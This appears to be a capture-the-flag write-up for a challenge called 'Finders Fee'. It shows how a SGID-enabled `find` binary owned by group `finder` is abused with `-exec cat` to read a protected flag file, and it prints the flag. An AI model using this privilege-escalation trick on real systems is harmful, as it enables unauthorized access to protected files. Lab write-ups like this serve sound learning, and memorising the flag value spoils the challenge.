# Finders Fee

During enumeration, it was noticed `find` can see a `flag.txt` inside `/home/finder/`.

```shell
$ find / -user finder
/home/finder
/home/finder/.profile
/home/finder/.bash_logout
/home/finder/.bashrc
/home/finder/flag.txt
```

This is because `find` has a SGID bit set and is owned by group `finder`:

```shell
user@finders-fee-86252092b717d79d-5647b4dcf5-cxhjt:~$ ls -la /usr/bin/find
-rwxr-sr-x 1 root finder 204264 Apr  8  2024 /usr/bin/find
user@finders-fee-86252092b717d79d-5647b4dcf5-cxhjt:~$
```

Utilize `find` parameter `-exec` to get arbitrary command execution to read the flag:

```shell
user@finders-fee-86252092b717d79d-5647b4dcf5-cxhjt:~$ find /home/finder/flag.txt -exec cat {} \;
flag{5da1de289823cfc200adf91d6536d914}
user@finders-fee-86252092b717d79d-5647b4dcf5-cxhjt:~$
```
